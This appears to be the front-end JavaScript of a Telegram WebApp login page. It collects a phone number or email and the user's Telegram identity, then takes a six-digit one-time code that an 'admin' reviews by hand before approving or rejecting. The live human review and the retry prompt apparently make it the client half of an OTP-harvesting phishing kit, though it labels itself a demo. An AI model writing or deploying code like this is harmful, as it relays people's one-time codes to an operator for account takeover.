const API = ""; // same origin

function tgUser() {
  const u = window.Telegram?.WebApp?.initDataUnsafe?.user;
  if (!u) return { telegram_id: null, username: "", first_name: "" };
  return { telegram_id: u.id, username: u.username || "", first_name: u.first_name || "" };
}

function expandWebApp() {
  if (window.Telegram?.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }
}
expandWebApp();

// ---------- LOGIN PAGE ----------
const sendCodeBtn = document.getElementById("sendCodeBtn");
if (sendCodeBtn) {
  sendCodeBtn.addEventListener("click", async () => {
    const phone = document.getElementById("phone").value.trim();
    if (!phone) return alert("Enter a phone number or email.");
    await requestOtp(phone);
  });

  document.getElementById("emailBtn").addEventListener("click", async () => {
    const email = prompt("Enter your email:");
    if (!email) return;
    await requestOtp(email.trim());
  });

  document.getElementById("noAccount").addEventListener("click", (e) => {
    e.preventDefault();
    alert("Demo system — no real signup. Just enter any phone/email.");
  });
}

async function requestOtp(identifier) {
  const u = tgUser();
  const body = { identifier, ...u };
  const r = await fetch(`${API}/api/request-otp`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!r.ok) return alert("Failed to create request.");
  const data = await r.json();
  sessionStorage.setItem("request_id", data.request_id);
  sessionStorage.setItem("identifier", identifier);
  location.href = "/otp";
}

// ---------- OTP PAGE ----------
function initOtpPage() {
  const ident = sessionStorage.getItem("identifier") || "your device";
  document.getElementById("identShow").textContent = ident;

  const boxes = document.querySelectorAll(".otp-box");
  boxes.forEach((box, i) => {
    box.addEventListener("input", () => {
      box.value = box.value.replace(/\D/g, "").slice(0, 1);
      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
      if (getOtp().length === 6) submitOtp();
    });
    box.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !box.value && i > 0) boxes[i - 1].focus();
    });
  });
  boxes[0].focus();

  startPolling();
}

function getOtp() {
  return Array.from(document.querySelectorAll(".otp-box")).map((b) => b.value).join("");
}

let submitted = false;
async function submitOtp() {
  if (submitted) return;
  submitted = true;
  const otp = getOtp();
  const request_id = parseInt(sessionStorage.getItem("request_id"), 10);
  await fetch(`${API}/api/submit-otp`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ request_id, otp }),
  });
  setStatus("Waiting for admin to verify…");
}

function setStatus(text, kind) {
  const el = document.getElementById("status");
  el.className = "status" + (kind ? " " + kind : "");
  el.innerHTML = kind === "error" ? text : `<span class="spinner"></span>${text}`;
}

async function startPolling() {
  const request_id = parseInt(sessionStorage.getItem("request_id"), 10);
  if (!request_id) return;
  setInterval(async () => {
    try {
      const r = await fetch(`${API}/api/check-status?request_id=${request_id}`);
      const data = await r.json();
      if (data.status === "approved") {
        localStorage.setItem("token", data.token);
        setStatus("Approved! Loading dashboard…", "success");
        setTimeout(() => (location.href = "/dashboard"), 600);
      } else if (data.status === "rejected") {
        setStatus("OTP is not correct. Please try again.", "error");
        submitted = false;
        document.querySelectorAll(".otp-box").forEach((b) => (b.value = ""));
        document.querySelector(".otp-box").focus();
      } else if (data.status === "awaiting_decision") {
        setStatus("Admin is reviewing your code…");
      }
    } catch (e) {}
  }, 2000);
}

// ---------- DASHBOARD ----------
if (location.pathname === "/dashboard") {
  const token = localStorage.getItem("token");
  if (!token) location.href = "/";
}
